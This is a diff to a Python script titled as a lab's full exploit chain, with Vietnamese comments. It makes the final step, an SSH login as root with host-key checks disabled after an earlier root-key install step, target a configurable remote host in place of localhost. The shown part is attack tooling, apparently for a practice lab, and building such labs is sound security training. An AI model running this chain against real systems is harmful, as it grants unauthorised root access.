@@ -15,6 +15,7 @@ import re
 import subprocess
 import sys
 from pathlib import Path
+from urllib.parse import urlparse
 
 import requests
 
@@ -246,11 +247,11 @@ def install_root_key(base):
 # ============================================================
 # BƯỚC 8 — SSH VÀO ROOT
 # ============================================================
-def ssh_root(ssh_port):
-    log("8", f"SSH vào root@localhost:{ssh_port}")
+def ssh_root(ssh_host, ssh_port):
+    log("8", f"SSH vào root@{ssh_host}:{ssh_port}")
 
     subprocess.run(
-        ["ssh-keygen", "-R", f"[localhost]:{ssh_port}"],
+        ["ssh-keygen", "-R", f"[{ssh_host}]:{ssh_port}"],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
     )
@@ -262,7 +263,7 @@ def ssh_root(ssh_port):
         "-o", "StrictHostKeyChecking=no",
         "-o", "UserKnownHostsFile=/dev/null",
         "-o", "BatchMode=yes",
-        "root@localhost",
+        f"root@{ssh_host}",
         "id; hostname; whoami",
     ]
     r = subprocess.run(cmd, capture_output=True, text=True)
@@ -284,9 +285,12 @@ def ssh_root(ssh_port):
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--base", default=DEFAULT_BASE)
+    parser.add_argument("--ssh-host", default=None)
     parser.add_argument("--ssh-port", type=int, default=DEFAULT_SSH_PORT)
     parser.add_argument("--no-ssh", action="store_true")
     args = parser.parse_args()
+
+    ssh_host = args.ssh_host or urlparse(args.base).hostname or "localhost"
 
     print("=" * 60)
     print(" BREWCART LAB — FULL EXPLOIT CHAIN")
@@ -315,7 +319,7 @@ def main():
         sys.exit(1)
 
     if not args.no_ssh:
-        if not ssh_root(args.ssh_port):
+        if not ssh_root(ssh_host, args.ssh_port):
             sys.exit(1)
 
     print("\n✅ HOÀN THÀNH")
